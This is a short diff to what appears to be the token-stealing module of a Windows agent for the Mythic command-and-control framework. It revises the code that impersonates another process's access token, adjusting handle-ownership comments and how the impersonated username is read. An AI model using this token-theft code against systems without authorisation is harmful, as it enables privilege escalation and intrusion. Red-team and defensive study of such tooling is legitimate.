@@ -7,7 +7,6 @@ import token_manager
 
 when defined(windows):
   import winim/lean
-  import std/os
   
   proc stealToken*(taskId: string, params: JsonNode): JsonNode =
     ## Steal a token from a target process
@@ -62,17 +61,18 @@ when defined(windows):
         CloseHandle(impersonationToken)
         return mythicError(taskId, &"Failed to revert to self. Error code: {errorCode}")
       
-      # Set the thread token
+      # Set the thread token (SetThreadToken makes a copy, so we keep our handle)
       if SetThreadToken(nil, impersonationToken) == 0:
         let errorCode = GetLastError()
         CloseHandle(impersonationToken)
         return mythicError(taskId, &"Failed to set thread token. Error code: {errorCode}")
       
-      # Store the token handle
+      # Store the token handle for later cleanup
+      # We keep the handle since SetThreadToken doesn't take ownership
       setTokenHandle(impersonationToken)
       
       # Get the new user context (after impersonation)
-      let newUser = getEnv("USERNAME", "impersonated_user")
+      let newUser = getCurrentUsername()
       
       if cfg.debug:
         echo &"[DEBUG] Successfully stole token from PID {pid}: {newUser}"
